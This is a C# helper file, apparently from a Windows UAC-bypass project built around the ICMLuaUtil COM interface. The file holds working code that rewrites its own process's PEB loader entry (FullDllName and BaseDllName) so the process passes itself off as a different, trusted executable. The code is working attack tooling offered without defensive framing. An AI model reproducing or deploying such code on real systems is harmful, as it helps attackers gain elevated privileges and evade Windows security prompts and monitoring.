using System;
using System.IO;
using System.Runtime.InteropServices;
using ICMLuaUtilElevation.Class;
using ICMLuaUtilElevation.Native.Struct;
using Vanara.InteropServices;
using Vanara.PInvoke;

namespace ICMLuaUtilElevation.Helper
{
    internal static class PEBHelper
    {
        public static IDisposable MasqueradePEB(string MasqPath)
        {
            if (MasqueradePEB(MasqPath, Environment.ProcessPath))
            {
                return new DisposableActionExecutor(() =>
                {
                    MasqueradePEB(Environment.ProcessPath, MasqPath);
                });
            }

            throw new NotSupportedException();
        }

        private static bool MasqueradePEB(string MasqPath, string ProcessPath)
        {
            using (Kernel32.SafeHPROCESS ProcessHandle = Kernel32.OpenProcess(ACCESS_MASK.FromEnum(Kernel32.ProcessAccess.PROCESS_QUERY_INFORMATION | Kernel32.ProcessAccess.PROCESS_VM_READ | Kernel32.ProcessAccess.PROCESS_VM_WRITE | Kernel32.ProcessAccess.PROCESS_VM_OPERATION), false, Kernel32.GetCurrentProcessId()))
            {
                NtDll.PROCESS_BASIC_INFORMATION ProcessInfo = NtDll.NtQueryInformationProcess<NtDll.PROCESS_BASIC_INFORMATION>(ProcessHandle, NtDll.PROCESSINFOCLASS.ProcessBasicInformation);

                using (SafeHGlobalStruct<PEB_DATA> PEBPtr = new SafeHGlobalStruct<PEB_DATA>())
                {
                    if (Kernel32.ReadProcessMemory(ProcessHandle, ProcessInfo.PebBaseAddress, PEBPtr, PEBPtr.Size, out _))
                    {
                        NativeWin32API.RtlEnterCriticalSection(PEBPtr.Value.FastPebLock);

                        try
                        {
                            nint Module = FindCorrectLDRLocationFromLink(Marshal.PtrToStructure<PEB_LDR_DATA>(PEBPtr.Value.Ldr).InLoadOrderModuleList.Flink, ProcessPath);

                            if (Module != nint.Zero)
                            {
                                // Set value to FullDllName
                                if (MakeSureStringWriteIntoProcess(ProcessHandle, new nint(Module.ToInt64() + 0x48), MasqPath))
                                {
                                    // Set value to BaseDllName
                                    if (MakeSureStringWriteIntoProcess(ProcessHandle, new nint(Module.ToInt64() + 0x58), Path.GetFileName(MasqPath)))
                                    {
                                        return true;
                                    }
                                }
                            }
                        }
                        finally
                        {
                            NativeWin32API.RtlLeaveCriticalSection(PEBPtr.Value.FastPebLock);
                        }
                    }
                }
            }

            return false;
        }

        private static nint FindCorrectLDRLocationFromLink(nint Module, string ProcessPath)
        {
            static nint FindCorrectLDRLocationFromLinkCore(nint StartModule, nint NextModule, string ProcessPath)
            {
                LDR_DATA_TABLE_ENTRY LDRTableEntry = Marshal.PtrToStructure<LDR_DATA_TABLE_ENTRY>(NextModule);

                if (!string.Equals(ProcessPath, LDRTableEntry.FullDllName.ToString(), StringComparison.OrdinalIgnoreCase))
                {
                    NextModule = LDRTableEntry.InLoadOrderLinks.Flink;

                    if (StartModule != NextModule)
                    {
                        return FindCorrectLDRLocationFromLinkCore(StartModule, NextModule, ProcessPath);
                    }

                    return nint.Zero;
                }

                return NextModule;
            }

            return FindCorrectLDRLocationFromLinkCore(Module, Module, ProcessPath);
        }

        private static bool MakeSureStringWriteIntoProcess(HPROCESS ProcessHandle, nint DestinationAddress, string UnicodeValue)
        {
            if (Kernel32.VirtualProtectEx(ProcessHandle, DestinationAddress, Marshal.SizeOf<NtDll.UNICODE_STRING>(), Kernel32.MEM_PROTECTION.PAGE_EXECUTE_READWRITE, out _))
            {
                NtDll.UNICODE_STRING masq = new NtDll.UNICODE_STRING()
                {
                    Length = (ushort)(UnicodeValue.Length * 2),
                    MaximumLength = (ushort)(UnicodeValue.Length * 2 + 2),
                    Buffer = Marshal.StringToHGlobalUni(UnicodeValue)
                };

                using (SafeHGlobalStruct<NtDll.UNICODE_STRING> masqPtr = new SafeHGlobalStruct<NtDll.UNICODE_STRING>(masq))
                {
                    if (Kernel32.WriteProcessMemory(ProcessHandle, DestinationAddress, masqPtr, masqPtr.Size, out _))
                    {
                        using (SafeHGlobalStruct<NtDll.UNICODE_STRING> NewMasqPtr = new SafeHGlobalStruct<NtDll.UNICODE_STRING>(masq))
                        {
                            if (Kernel32.ReadProcessMemory(ProcessHandle, DestinationAddress, NewMasqPtr, NewMasqPtr.Size, out _))
                            {
                                if (NewMasqPtr.Value.ToString() == UnicodeValue)
                                {
                                    return true;
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }
    }
}
